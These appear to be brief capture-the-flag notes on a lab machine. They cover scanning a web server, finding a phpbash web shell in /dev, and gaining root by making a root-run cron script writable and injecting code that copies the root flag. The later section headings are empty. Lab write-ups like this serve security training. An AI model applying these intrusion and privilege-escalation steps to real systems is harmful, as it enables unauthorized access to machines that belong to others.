**IPv4: 10.10.10.68**
10.129.234.64
## Enumeration/Scanning
sudo nmap -sV -sC -O -v -Pn $IP

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

sudo gobuster dir -u http://10.129.234.64 -w /usr/share/wordlists/dirb/common.txt
/css                  (Status: 301) [Size: 312] [--> http://10.129.234.64/css/]
/dev                  (Status: 301) [Size: 312] [--> http://10.129.234.64/dev/]
/fonts                (Status: 301) [Size: 314] [--> http://10.129.234.64/fonts/]
/images               (Status: 301) [Size: 315] [--> http://10.129.234.64/images/]
/index.html           (Status: 200) [Size: 7743]
/js                   (Status: 301) [Size: 311] [--> http://10.129.234.64/js/]
/php                  (Status: 301) [Size: 312] [--> http://10.129.234.64/php/]
/server-status        (Status: 403) [Size: 301]
/uploads              (Status: 301) [Size: 316] [--> http://10.129.234.64/uploads/]

/dev/phpbash.php

webshell

got user flag

sudo -l

can run as scripmanager

sudo -u scriptmanager ls -la /scripts

root is running test.py every minute

sudo -u scriptmanager chmod 777 -R /scripts

echo "import os" > test.py
echo 'os.system("cat /root/root.txt > /tmp/flag.txt")' >> test.py

## Exploitation


## Privilege Escalation


## Post-exploitation
